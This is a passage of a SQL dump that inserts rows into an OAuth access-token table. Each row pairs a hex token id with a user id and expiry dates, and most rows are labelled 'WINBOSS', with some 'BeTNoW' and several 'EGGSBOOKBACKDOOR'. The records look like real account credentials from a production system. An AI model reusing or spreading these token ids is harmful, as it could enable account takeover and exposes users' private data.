('e5643f93573a6b16740af9ee4f8ae88b1f568e4aae73c09b962d593d860638e437d0ab1dba30a27a', '715357', 5, 'WINBOSS', '[]', 0, '2022-12-26 14:32:44', '2022-12-26 14:32:44', '2023-12-26 14:32:44'),
('e59f3a227511f0df0e46aa46054442120790b359cbc543ba4c7102bd9dfa27a317d19faaa445f1d1', '732351', 5, 'WINBOSS', '[]', 0, '2023-11-07 16:47:31', '2023-11-07 16:47:31', '2024-11-07 16:47:31'),
('e5abdac461b2b63ca29146bd1a0aed5c4319416671029461c08e9ac392df6c99541c1645aea192e2', '967305', 5, 'WINBOSS', '[]', 0, '2024-01-12 10:43:33', '2024-01-12 10:43:33', '2025-01-12 10:43:33'),
('e5b039454f91ebdca9dde59cc7cb2a57f7a442fedc5901b3e7e85b3314ea1e73ee71fcd1fa29f6aa', '763581', 5, 'WINBOSS', '[]', 0, '2023-04-19 04:35:45', '2023-04-19 04:35:45', '2024-04-19 04:35:45'),
('e5d9bf0352cc5c2f6747674c2287e516f74a40d55b8b0a3faf5a5ef79848879afbc7674a6d96db68', '371400', 5, 'WINBOSS', '[]', 0, '2022-07-13 03:34:57', '2022-07-13 03:34:57', '2023-07-13 03:34:57'),
('e5eb0c9444c4a61a9f0c3f91d82f026c9071f056c549ab7c6d5332fce2578c0d92c8ecf3482f81f2', '140692', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:37:23', '2022-12-17 10:37:23', '2023-12-17 10:37:23'),
('e5f913eb6ed62f74520a5ed840776f20b1687038df9624d823ff5fef2357daf22bcc741e91b9d7b5', '642443', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:50:48', '2024-01-22 04:50:48', '2025-01-22 04:50:48'),
('e607af4dcf12b3fe81b2ac55a3c202b6753e7a2e5b7d74613998460f19c3ca0423d08fed09987053', '102887', 5, 'WINBOSS', '[]', 0, '2022-06-25 04:18:38', '2022-06-25 04:18:38', '2023-06-25 04:18:38');
INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('e67557fc853bbde1726800f27a3cd362e54f424240a6cf44fffe5e742c6c829c05997d6d9cce3bd9', '988685', 5, 'WINBOSS', '[]', 0, '2023-07-31 04:52:33', '2023-07-31 04:52:33', '2024-07-31 04:52:33'),
('e6b59685049733dcbc7c630f0e14b4b5cc4d8b6508eee29bc8511e49a2a9a2ae846b42d45ba33857', '353306', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-08 04:26:09', '2023-11-08 04:26:09', '2024-11-08 04:26:09'),
('e6c312a4951049714a18dee3cde74d190f6a138a0cccfd064204175e8ccef29a6221a4127e11144d', '472783', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:41:57', '2022-12-25 22:41:57', '2023-12-25 22:41:57'),
('e6d24b897bf4122b3c1d909fd8a38ced6209c5f729adb4a4f9b3e57980f611045be38d96d5655f11', '590910', 5, 'WINBOSS', '[]', 0, '2023-07-24 07:18:14', '2023-07-24 07:18:14', '2024-07-24 07:18:14'),
('e74e1fb8273f1c2b097e492fdb0d8d4aacb5141f33faf958e417ff4831e913c69943d6e1d5ca493d', '118173', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:20:31', '2022-11-21 10:20:31', '2023-11-21 10:20:31'),
('e7a82d905699f7a127c7259cd553a966bb5c74e65b6b43a68c6da91fcb7d519c43ee00f6e76dfdcb', '615073', 5, 'WINBOSS', '[]', 0, '2023-08-21 09:58:05', '2023-08-21 09:58:05', '2024-08-21 09:58:05'),
('e806a2a448fadb8d0a625b2d1ff41c7eb08db5ed633fd4dfce0f9a5e6a69af1f7466530ecc429623', '952510', 5, 'WINBOSS', '[]', 0, '2023-08-03 13:06:28', '2023-08-03 13:06:28', '2024-08-03 13:06:28'),
('e81cb8ebf5da5b5fb24211b8f469bd510565a6ffd1853cf00ca735507d29f7611e636856ced81310', '221913', 5, 'WINBOSS', '[]', 0, '2022-10-12 05:36:04', '2022-10-12 05:36:04', '2023-10-12 05:36:04'),
('e823ad90a100f66a1dfe62458291954da243793cbcbd5dabb8b0ac85073143b0e92d706451b148d1', '175153', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2024-01-22 02:40:40', '2024-01-22 02:40:40', '2025-01-22 02:40:40'),
('e8511e933b6a5b7fd7c0165d1206e392eab6fae1e788490760db7c3bf63cfb99234fd247b5ba00d2', '247426', 5, 'WINBOSS', '[]', 0, '2022-10-11 03:15:51', '2022-10-11 03:15:51', '2023-10-11 03:15:51'),
('e8a3fa1aea67826dc4e4d38e763477a29bded2a4e3b09765f974f910428da68fa1aa2d08183c5df0', '984712', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:15:47', '2022-12-07 15:15:47', '2023-12-07 15:15:47'),
('e8ae0396bc8443e6c532cadd75850254b0af21e894d9ae766baf81edca6b98bc828b752c3572abf8', '805555', 5, 'WINBOSS', '[]', 0, '2023-07-08 03:16:32', '2023-07-08 03:16:32', '2024-07-08 03:16:32'),
('e8b62051a54c5d44b47b685b173db76f2ed4e3972e4dbc7698b5f10ab29ea03ddd9243788d734883', '312556', 5, 'WINBOSS', '[]', 0, '2022-11-18 04:29:31', '2022-11-18 04:29:31', '2023-11-18 04:29:31'),
('e9083e223ead25cafec4a9ecfe7adeaed4741379bc9ab9c255b46183606109b476449153437f17db', '901230', 5, 'WINBOSS', '[]', 0, '2023-07-25 04:18:56', '2023-07-25 04:18:56', '2024-07-25 04:18:56'),
('e90a22cae9b6e966048a95f1adc05f1e0985d65527aeb263a8a50a27b7c9da3713d31b40af1f4e34', '139848', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:04:29', '2023-12-30 06:04:29', '2024-12-30 06:04:29'),
('e914eb8733668680d117e526329d2a4cd74f8382312fd8e765ff9fb50b55b9f40bdb1e7ee37b1352', '166609', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:11:55', '2022-09-01 05:11:55', '2023-09-01 05:11:55'),
('e96051fd572927388e0bcb4c7276f313152404141c2fba78b53377d3a2d66847961484c088521bf0', '114234', 5, 'WINBOSS', '[]', 0, '2023-05-21 12:10:12', '2023-05-21 12:10:12', '2024-05-21 12:10:12'),
('e970ad32352fb8b92ccda5861c34a97cd5a9032c68e1c926475741a0ec9ccaafa49134a322ae1dfa', '705693', 5, 'WINBOSS', '[]', 0, '2022-12-11 06:34:07', '2022-12-11 06:34:07', '2023-12-11 06:34:07'),
('e9d6dcb8be29d86eb91451512ad888f9f5868187b7bd7919fe24e1eca9e12fa8f4d33aed2a2ab18b', '398942', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:46:33', '2023-05-31 05:46:33', '2024-05-31 05:46:33'),
('e9d9826ef2fb84326418260f701cb227ffdb142c6aef68b29189bdc4f8672aa6a81127b82b17bd81', '354076', 5, 'WINBOSS', '[]', 0, '2022-10-01 00:43:14', '2022-10-01 00:43:14', '2023-10-01 00:43:14'),
('ea4e2f65bf25cb02832cfa773406e12db6486f6b8924547677cb659a3fbf6204f094a55fce469795', '628721', 5, 'WINBOSS', '[]', 0, '2023-12-12 14:47:33', '2023-12-12 14:47:33', '2024-12-12 14:47:33'),
('ea8fe4e630bb4c1cbc0b1f7cbb77d3e37ff3c4fdea53ee7ac0c5fb54d4c9ffb61120e9190079fd15', '235335', 5, 'BeTNoW', '[]', 0, '2023-01-09 07:40:09', '2023-01-09 07:40:09', '2024-01-09 07:40:09'),
('eaa923160f6caa59a863ca8bfd6bee41058085ada819cd68b78a2ba2d4fefd603e5faf96328e7019', '342559', 5, 'WINBOSS', '[]', 0, '2023-06-07 05:04:20', '2023-06-07 05:04:20', '2024-06-07 05:04:20'),
('eaab1e11f3e4adddbc61bf9f6a3598c1f8aa04a46d695035cbe92adc146e203a709c6b3e87c0e9b9', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:17:07', '2022-11-21 10:17:07', '2023-11-21 10:17:07'),
('eacf374a60725cb7073ef1c3326cc8c141a0ff021475e3d1924f472a4d75a0b5b99f138f9dbf26ed', '538309', 5, 'WINBOSS', '[]', 0, '2022-08-17 07:46:38', '2022-08-17 07:46:38', '2023-08-17 07:46:38'),
('eb32c1f8cb18a80b28271c0fc5453f65d42bc77974faebd26f688724ae09b7afba03661101896293', '949878', 5, 'BeTNoW', '[]', 0, '2023-01-16 06:51:46', '2023-01-16 06:51:46', '2024-01-16 06:51:46'),
('eb358726ec12af03b01dc04439bd8afc3a63a5e03d18a4da11b24137ceed8c5863c11880f7a19f5a', '635377', 5, 'WINBOSS', '[]', 0, '2022-12-27 04:21:54', '2022-12-27 04:21:54', '2023-12-27 04:21:54'),
('eb616e31872a441dda6f7d199f91a3d88d96ec22bb4bcef24ec0c0a5556314771c70aade25252307', '514567', 5, 'WINBOSS', '[]', 0, '2023-07-30 04:31:06', '2023-07-30 04:31:06', '2024-07-30 04:31:06'),
('eb8617b7300dbab8ea05f735f3fc4a9fe9dd7a4214c504f009fe99a6a7ae626688b16b5cb9df69c8', '441947', 5, 'WINBOSS', '[]', 0, '2023-10-09 03:08:52', '2023-10-09 03:08:52', '2024-10-09 03:08:52'),
('eb9938aa3492f5977a3ed3e3019f9cf75c93ed2df6bab422f6a5e98d4b9a371751f870a9afa04a23', '878099', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:36:37', '2022-12-25 23:36:37', '2023-12-25 23:36:37'),
('ebd73a36506983a28c12f437eb5b58847d43b79b1ceadaab33d01554fd9f29cab842574742ba9c8e', '861857', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:19:04', '2022-06-28 08:19:04', '2023-06-28 08:19:04'),
('ebfdfa53c8251a8eff40d5e612dd4815bb8663c5225d8b7d27001d2ede72cf9038727300691bf54b', '972166', 5, 'WINBOSS', '[]', 0, '2023-06-15 10:53:26', '2023-06-15 10:53:26', '2024-06-15 10:53:26'),
('ec2f1ff1a9d7f7fafc0d750a85537a1743931b21c5ab5fde126ea2b11c2e21c2544de3b7502d4084', '150624', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-10-11 05:27:56', '2023-10-11 05:27:56', '2024-10-11 05:27:56'),
('ec33710a0a1697ec2ea93ea948a7f83754bc5d6e6da6d0684f91be04e3bb1ebe9c68d11624008650', '860462', 5, 'WINBOSS', '[]', 0, '2022-12-26 14:20:52', '2022-12-26 14:20:52', '2023-12-26 14:20:52'),
('ec5df29210cab43397965c6622c08a34aa1846a6b07d5ee9aec210b67c571ebe9b8be0be7557f98d', '731582', 5, 'WINBOSS', '[]', 0, '2022-12-10 14:58:05', '2022-12-10 14:58:05', '2023-12-10 14:58:05'),
('eccff58d359fae069bb8b996b3766f119dc7f0bccb22aff8fac460e94c61c2fad059e0561887f315', '507262', 5, 'WINBOSS', '[]', 0, '2022-06-28 07:47:17', '2022-06-28 07:47:17', '2023-06-28 07:47:17'),
('ecd565f8c5aa362be93a3c19dfbbf005b19981e4434b240ffb35355f87098ffc5d4d403a2fbcfde8', '733919', 5, 'BeTNoW', '[]', 0, '2022-07-07 11:28:00', '2022-07-07 11:28:00', '2023-07-07 11:28:00'),
('ece4f928917766dc9f0e3ff6d2a7bc9be1fe89694b508f52fff5d4476e8a39a63e2de59bc00694cd', '845108', 5, 'WINBOSS', '[]', 0, '2023-09-06 06:59:45', '2023-09-06 06:59:45', '2024-09-06 06:59:45'),
('ed3ccac1fa7232556aa6495f1d7ef0196dd3b71b3b40e88140531c761d88fe53e0ea6251c4a17dbd', '325937', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:03:30', '2022-12-07 15:03:30', '2023-12-07 15:03:30'),
('ed50cd180b2048681b8cd46307c430bc852a536e2984208d4cb5c36dc9de9b04d17377bb5390147f', '592427', 5, 'WINBOSS', '[]', 0, '2023-09-11 08:48:09', '2023-09-11 08:48:09', '2024-09-11 08:48:09'),
('ed65fed8055a00184f27ab2a0f9e3b67cfb602978d56eb197d7f2e612fc021b1636c1c723f671dd6', '236582', 5, 'WINBOSS', '[]', 0, '2022-11-18 02:20:30', '2022-11-18 02:20:30', '2023-11-18 02:20:30'),
('ed6e550669f7eebe76df1c09e6ca3e3353795be75f288c5ff2265a5ce17490983f18a022ef1c77c9', '336104', 5, 'WINBOSS', '[]', 0, '2023-04-26 04:39:21', '2023-04-26 04:39:21', '2024-04-26 04:39:21'),
('edc8932ff07665176dbc2e1681260affaa8fa47e34cdf5c9e74d1c8f9766b1cbaa3209054dbcc43c', '646129', 5, 'WINBOSS', '[]', 0, '2023-12-28 11:53:37', '2023-12-28 11:53:37', '2024-12-28 11:53:37'),
('ededbfdf122c49af682166eafaf04bd41b6e6d80d7bac11136e8e2ca0b3c04453535dad81e496a7d', '718419', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:27:20', '2022-12-25 23:27:20', '2023-12-25 23:27:20'),
('ee3eeaffdf6bd604857fd47489ffd8f32ef3ad338091cd91cc63e107f2bd11b361b6ec0d0af926fd', '483209', 5, 'WINBOSS', '[]', 0, '2024-01-05 06:03:54', '2024-01-05 06:03:54', '2025-01-05 06:03:54'),
('ee68cdc27af7ed22b8b0ef7ef789e786e6fdb5c4491fa80ea85e7e401cb6dba38d42afbb7ecb81ca', '871569', 5, 'WINBOSS', '[]', 0, '2022-11-05 01:54:56', '2022-11-05 01:54:56', '2023-11-05 01:54:56'),
('ee75162bb6ef34fb15adfa48ebebda9dea3b81271f1fb4edf828a15ed1d028c34b40b31c85b0753e', '958548', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:37:56', '2022-12-25 19:37:56', '2023-12-25 19:37:56'),
('ee83e5314c628cb4fda46c4df2fe452b0088cd484663748de2b257eccaf7d654f0cc56c5692aeb20', '113203', 5, 'WINBOSS', '[]', 0, '2022-08-17 11:26:21', '2022-08-17 11:26:21', '2023-08-17 11:26:21'),
('eef0bc9f5bd76fa20b0281d666ccb338f06c67814b8df81172b478e56f93fdf1de0c72e794e3ab12', '567427', 5, 'WINBOSS', '[]', 0, '2023-07-12 03:58:25', '2023-07-12 03:58:25', '2024-07-12 03:58:25'),
('efb5f956894bbc96ee505023c0d765abd965f3597ab06d9cdde22d0a0a89d37a3d8a2a2655474a50', '779720', 5, 'WINBOSS', '[]', 0, '2022-11-10 02:06:37', '2022-11-10 02:06:37', '2023-11-10 02:06:37'),
('efc7efcbad22a275419ea5e22862d913e68e1b29c98ad48c509b2b4417d2894f18a66a5ae39dbd17', '306542', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:21:03', '2022-06-28 08:21:03', '2023-06-28 08:21:03'),
('effdd26e4a20b4faf242d3382c851c3cbcc818def7274611dcd4189f6cfae8e3e663a1e254e9b86f', '144202', 5, 'WINBOSS', '[]', 0, '2023-01-19 17:00:29', '2023-01-19 17:00:29', '2024-01-19 17:00:29'),
('f018071599e0ff7bccf5aa2ae08526ccd1e387faced9ae947738c726e3c5b4e69ff74789b14ba7e6', '259006', 5, 'WINBOSS', '[]', 0, '2023-11-02 07:21:36', '2023-11-02 07:21:36', '2024-11-02 07:21:36'),
('f05eb7416ac4fec95927ff229cbaab5d716db728f7954d4f4c2ab52dbaad045e2ae94fd6775d9190', '286777', 5, 'WINBOSS', '[]', 0, '2023-03-22 04:45:35', '2023-03-22 04:45:35', '2024-03-22 04:45:35'),
('f09f0ae8587c41b36edd2d006b02cfc42dbc197fd0f93400b2d584a9140f9ef6ce40515879822578', '533860', 5, 'WINBOSS', '[]', 0, '2023-10-09 09:37:52', '2023-10-09 09:37:52', '2024-10-09 09:37:52'),
('f0b199b0dfd98d99015f1005892ebaeba499469bd8864ba6120d3766fc81028fd41c78a75a935a4c', '308387', 5, 'WINBOSS', '[]', 0, '2023-02-13 16:05:24', '2023-02-13 16:05:24', '2024-02-13 16:05:24'),
('f0e51756ea7da2e4dcd7f874fbdcf3dd98df75fe5a750732184c9076191f0b659bbdcebcb2ba597d', '856308', 5, 'WINBOSS', '[]', 0, '2023-02-22 05:40:56', '2023-02-22 05:40:56', '2024-02-22 05:40:56'),
('f11870fe696ef573a328d53d513c409fb6e4e4e5246da709b71df0f2848c00f0d852a0e0e40b9f01', '448293', 5, 'WINBOSS', '[]', 0, '2024-01-20 09:09:08', '2024-01-20 09:09:08', '2025-01-20 09:09:08'),
('f139458d92543b8491c5f9bae4e7f6d4f7e580d81037078d0dfaa4bf0d03b46346e5b85c421cc5ce', '433000', 5, 'WINBOSS', '[]', 0, '2022-07-12 07:42:49', '2022-07-12 07:42:49', '2023-07-12 07:42:49'),
('f1658754839b9fa004caf9b14a7ab8072f237fa42e9ba4644adb7c68fc21694ccb70dd63344a9a2d', '188311', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:20:43', '2022-06-28 08:20:43', '2023-06-28 08:20:43'),
('f170a939f11da5754de622d6460e2f20d4cb620bf291609ad66ec8d8cf0f7432f53ca377354e6ddf', '586278', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:26:22', '2022-12-25 20:26:22', '2023-12-25 20:26:22'),
('f204a7bac69a925b128e037b454fa516fb79f07e9afc4010709169bab55b0aa553f813a98b26d26c', '163046', 5, 'WINBOSS', '[]', 0, '2023-01-19 16:05:42', '2023-01-19 16:05:42', '2024-01-19 16:05:42'),
('f21d94ebc66fcbfee94a1512065dd0fcbb0c9f1448769daae3d7bb0d9a513561483893204d2598db', '454709', 5, 'WINBOSS', '[]', 0, '2023-01-13 04:26:09', '2023-01-13 04:26:09', '2024-01-13 04:26:09'),
('f248756025b24fe2598ac8bcd8f3a132a88f087a866f2eec930de4c5623edbea2a0b13162e717b6f', '552367', 5, 'WINBOSS', '[]', 0, '2023-01-03 08:00:02', '2023-01-03 08:00:02', '2024-01-03 08:00:02'),
('f25667450ee2015a5b5c7543688f5afb176b239278ef454aafa4a4abacb23cef497e771810514179', '379647', 5, 'WINBOSS', '[]', 0, '2024-01-20 16:45:47', '2024-01-20 16:45:47', '2025-01-20 16:45:47'),
('f2595e802e8753304721cef561070c5656687967e3b98829408e5c95249dbe437e65fc44ec1b612a', '111131', 5, 'WINBOSS', '[]', 0, '2023-05-08 05:06:02', '2023-05-08 05:06:02', '2024-05-08 05:06:02'),
('f29ccb6870e3221ca19777ee895e0cfb8cb800f4415af6f3e0c1898d8a39690fa52555d5d88616fa', '380984', 5, 'BeTNoW', '[]', 0, '2022-10-27 04:49:02', '2022-10-27 04:49:02', '2023-10-27 04:49:02'),
('f2b0786a86533b3cabf12020b60546dd7ed142cb31e05910d11ee7491d7a94b03decfc6ff0209c2b', '167395', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:22:48', '2022-12-10 13:22:48', '2023-12-10 13:22:48'),
('f2eec114176b177ba989718b869b3a3287fe3a44329257506c61a289dbd667e40c9321190d5bc4f3', '802794', 5, 'WINBOSS', '[]', 0, '2023-06-19 13:37:03', '2023-06-19 13:37:03', '2024-06-19 13:37:03'),
('f320ed0e1bd14e33cbec51be078922a2363cb32d1d1ff2a8d1135c6d21e2ddf8c0db5ef93ac3a9b7', '971514', 5, 'WINBOSS', '[]', 0, '2023-07-17 04:56:17', '2023-07-17 04:56:17', '2024-07-17 04:56:17'),
('f362bf1de51955af369ae26f4b539d36b732bb6c8c153bb37488e972a38320d4f96f63b8244c24a3', '343134', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:21:09', '2022-12-07 14:21:09', '2023-12-07 14:21:09'),
('f3632ee24b8249506bfea07d935efe3b66f6b15a8c9af55a5ff726e859f4b96f080310f8b5cc1110', '343202', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:26:52', '2022-06-28 08:26:52', '2023-06-28 08:26:52'),
('f3c3a9b713acd1e2c6510ede3c2e067cf0a32fbd652bf903023a7d654cb45dc4b112817dd93f5fdb', '135536', 5, 'WINBOSS', '[]', 0, '2023-11-10 03:05:15', '2023-11-10 03:05:15', '2024-11-10 03:05:15'),
('f400285d386bbf87555286378f853db442c548f4652368086f2392ce4d154f5f8cc772d3d7c8f04c', '920591', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:24:37', '2023-12-30 06:24:37', '2024-12-30 06:24:37'),
('f463493fc7695eba34f54cf5554ef9aae3f0088f690c37bab0ef2609e425a2f7850e84aa299ef497', '906558', 5, 'WINBOSS', '[]', 0, '2023-10-26 09:31:08', '2023-10-26 09:31:08', '2024-10-26 09:31:08'),
('f4cdadb389ccee563dcf3717a95609d8b6b8ef7c16c9be4fdd9eeea0a789449fa44636845372c5eb', '987965', 5, 'WINBOSS', '[]', 0, '2023-08-20 21:33:50', '2023-08-20 21:33:50', '2024-08-20 21:33:50'),
('f4cfb4cbc04e1888a04f3f821fffbdd89ebbff5034f7d9f9fee013c55e57af0b091fde0310990212', '904509', 5, 'WINBOSS', '[]', 0, '2022-07-06 17:04:33', '2022-07-06 17:04:33', '2023-07-06 17:04:33'),
('f4d9224060a9424cbbd395d175ae299c37032cafba6b8d613eb3dbb71564a380b8de23270e2f6c4c', '575334', 5, 'WINBOSS', '[]', 0, '2023-03-04 06:18:15', '2023-03-04 06:18:15', '2024-03-04 06:18:15'),
('f4ea99f7c2651b8d80946618a788e7b2377e04af8484a30bf98eb45158bf5dee7e110f8908bc7bc8', '185770', 5, 'WINBOSS', '[]', 0, '2024-01-14 02:40:33', '2024-01-14 02:40:33', '2025-01-14 02:40:33'),
('f4f71037685d08acf250ab5554287c222e351ccf7d1ccfeffdaba2a4506e1ff68548611ae1c8573e', '313043', 5, 'WINBOSS', '[]', 0, '2023-12-08 06:17:26', '2023-12-08 06:17:26', '2024-12-08 06:17:26'),
('f5023096de55c708c2137ecc03aa6ce1687c4d8d1e520948d5cfd95a07b9acbb80b31589ccb7ca05', '847764', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:20:15', '2022-06-28 08:20:15', '2023-06-28 08:20:15'),
('f518e7d4fb471d01508ee80b8fad6e0448a103e88d98a13f89432ca60c0c65b2f59a25b59cf4c229', '777213', 5, 'WINBOSS', '[]', 0, '2022-12-26 15:56:56', '2022-12-26 15:56:56', '2023-12-26 15:56:56'),
('f53f83ff88474d618722ea6a240b6a0a7be76dbaecfc998396c21afc579b171f23a0f14d0e541605', '653962', 5, 'WINBOSS', '[]', 0, '2023-04-20 05:13:37', '2023-04-20 05:13:37', '2024-04-20 05:13:37'),
('f5bd46d0f9e87495f9246dde32eee03efb9e24d5e01697ac304084bf4cfc3ba284b4a92e643e809f', '362751', 5, 'WINBOSS', '[]', 0, '2023-06-30 14:09:46', '2023-06-30 14:09:46', '2024-06-30 14:09:46'),
('f5c687e627664d6c30451c65ede0ba4440e3079e49b46e9586919d0bcf7902cc847aad2161937b24', '859600', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:41:41', '2022-12-26 13:41:41', '2023-12-26 13:41:41'),
('f5d8828a2aeff2ff227bdf0da174000847ac3b6e39f997f6c389319f0676a518c333ac4b91737168', '103139', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-02-17 09:51:43', '2023-02-17 09:51:43', '2024-02-17 09:51:43'),
('f606f6d11b3f3e20c41f4f512a6b3fa9ceb44e32a7316cc55a373cb6647638a48aa1373708156aa1', '307244', 5, 'WINBOSS', '[]', 0, '2022-12-26 16:12:37', '2022-12-26 16:12:37', '2023-12-26 16:12:37'),
('f65d00753e23479ee27759346c9e641529d69c1c10b696b70e0b8078a9bf3ff8237214b4d85e1b9d', '977727', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:38:04', '2022-09-01 05:38:04', '2023-09-01 05:38:04'),
('f69e438a2da5b9de32a10f1d5d8dffb0bfd0f2e2841f3534ca544042acd27f216e239b18fa68cc41', '288123', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:22:10', '2023-12-30 06:22:10', '2024-12-30 06:22:10'),
('f69ff145c5c9a14280a46c551f18e6ddd653cbbeeb905cb75e3fd96c55bb49aba7b43988850e9460', '113522', 5, 'WINBOSS', '[]', 0, '2022-12-14 18:22:23', '2022-12-14 18:22:23', '2023-12-14 18:22:23'),
('f6d56846decd29c7e1fced2cb9643d5c036cf7607f76fe6050585a81522d23b514d0f12bc3e21b5d', '333937', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:51:18', '2023-08-15 08:51:18', '2024-08-15 08:51:18'),
('f6f5a448143a45486f34d02a089cc1a31e21ab4c6b4287ea494d893f70418a0b2a34522202c9b6e8', '337843', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:59:33', '2023-08-15 08:59:33', '2024-08-15 08:59:33'),
('f71c2d69f3bc9c84cd0f18284671e95122095e0ae7d9974876ba22a6f3b70bec08014b1070abc1ff', '324200', 5, 'WINBOSS', '[]', 0, '2024-01-14 02:39:18', '2024-01-14 02:39:18', '2025-01-14 02:39:18'),
('f7425f28f85c5ebf4879c38b2f84d1a7d6e7b7b21131b4d9d670d5d6897bf977774e15e98d2a47b5', '279315', 5, 'WINBOSS', '[]', 0, '2023-06-27 08:00:59', '2023-06-27 08:00:59', '2024-06-27 08:00:59'),
('f74489a3208877811b8d6b939b10ae241d46eb240b0975129494b137cb6ce1dbaa057f63b4fa37b3', '848145', 5, 'WINBOSS', '[]', 0, '2022-07-04 04:26:07', '2022-07-04 04:26:07', '2023-07-04 04:26:07'),
('f74a1aa40710acd2b9d29d14b3203f81bbba2dd29101548a9df083a5b8b621f96a6d1392544bf3e4', '215889', 5, 'WINBOSS', '[]', 0, '2022-11-25 17:00:41', '2022-11-25 17:00:41', '2023-11-25 17:00:41'),
('f75ec327af15f37181277b98cea609087d61c253f55e59d5fe3d0c044e689a8b69a6c2b6390d2e92', '785499', 5, 'WINBOSS', '[]', 0, '2023-02-08 18:31:58', '2023-02-08 18:31:58', '2024-02-08 18:31:58'),
('f78bf1ea4ccc51b530475df619a3bdc3809d2d7ba1398d5b82b4ee9c3b4ff30c0469241a91ccf7bc', '838907', 5, 'WINBOSS', '[]', 0, '2022-07-05 09:23:24', '2022-07-05 09:23:24', '2023-07-05 09:23:24'),
('f794435f60499d2f8c53ae44d38d7fe6f2858ef796aea238d8c04b7e8593d1165763674588e907c3', '550471', 5, 'WINBOSS', '[]', 0, '2023-06-05 16:09:47', '2023-06-05 16:09:47', '2024-06-05 16:09:47'),
('f7cdaeb5929e96e520b828e15d18e79eb676d4ccf87d0fcb4975abc9f42845996779e8c99f246324', '636330', 5, 'WINBOSS', '[]', 0, '2022-10-01 11:03:47', '2022-10-01 11:03:47', '2023-10-01 11:03:47'),
('f7fb44bc076b58cbdcb0351af73a91cae0a1fa7a7b300698451095fa2ed05ea3732523da47f5b8a7', '513069', 5, 'WINBOSS', '[]', 0, '2023-02-07 09:44:22', '2023-02-07 09:44:22', '2024-02-07 09:44:22'),
('f817fb38f3646ff22031bb8f6bb68d8bb03e5f421a93d61d77270c3dbcb837d66161ec808b1e9734', '851812', 5, 'WINBOSS', '[]', 0, '2022-08-23 10:34:59', '2022-08-23 10:34:59', '2023-08-23 10:34:59'),
('f84c62e72def9cc1fbe6141815227825c5981152d7153ef74296ca7c5a5d883dc2c311a049bc4cf9', '663541', 5, 'WINBOSS', '[]', 0, '2023-02-03 02:08:17', '2023-02-03 02:08:17', '2024-02-03 02:08:17'),
('f873f6b7e3d47da32857fe0bb6d203fd54794a594096da72ecd82ea2c8d683b4b8bb446aac4ea257', '980736', 5, 'WINBOSS', '[]', 0, '2023-11-05 08:26:13', '2023-11-05 08:26:13', '2024-11-05 08:26:13'),
('f8807e5e6890fcfe1891f89bf22e67b5c63f40887a3849ee8123ffb8744cdf9c421305a1e408f990', '921830', 5, 'WINBOSS', '[]', 0, '2022-12-08 04:27:21', '2022-12-08 04:27:21', '2023-12-08 04:27:21'),
('f89248a174d4a069fe480a63eb76c45e1967f53907fefb2763abf7d2eda2ad9b2f5197fd4dbae0a7', '174794', 5, 'WINBOSS', '[]', 0, '2022-11-17 08:54:56', '2022-11-17 08:54:56', '2023-11-17 08:54:56'),
('f89d3f9b9d01bad885266105ae3855523bb5e79f9e62e552319f9e90e6fc5c77bda91dabe02a6516', '417704', 5, 'WINBOSS', '[]', 0, '2022-08-06 04:35:23', '2022-08-06 04:35:23', '2023-08-06 04:35:23'),
('f90588d0505dbda24f13052d59907966725b886a03b7ab61811db1a467522a4b6e96e2b78a6d6a1e', '238838', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:02:03', '2022-12-07 15:02:03', '2023-12-07 15:02:03'),
('f90a9e10d322494c7608122f12666b8c1a743d286e78571cfa3dac9b40c41a237cb1b9213fd526c3', '292990', 5, 'BeTNoW', '[]', 0, '2023-01-03 02:59:55', '2023-01-03 02:59:55', '2024-01-03 02:59:55'),
('f931421eff4d51f85f0baa5e7316e423b1de129122ea61be3972b6a57d6729fef2d37f822361b04b', '753173', 5, 'WINBOSS', '[]', 0, '2022-12-15 05:20:35', '2022-12-15 05:20:35', '2023-12-15 05:20:35'),
('f93152a91b23bddde80fd2d76a791fbca9cebe9adbb73976ae389063399e119d15d669aa5e3b1c03', '952088', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:08:33', '2024-01-15 02:08:33', '2025-01-15 02:08:33'),
('f953921a81e38ea8136d3bec4f42ca0504820256e21ea669b53002f32b3663c113753351e3381abe', '809538', 5, 'WINBOSS', '[]', 0, '2023-08-17 02:39:39', '2023-08-17 02:39:39', '2024-08-17 02:39:39'),
('f9567d94acb6772a7b777d2cb7d070eb0358fc45a38f56db8683e33a57d4e741644b5e310d2c5658', '763591', 5, 'WINBOSS', '[]', 0, '2023-06-09 22:26:36', '2023-06-09 22:26:36', '2024-06-09 22:26:36'),
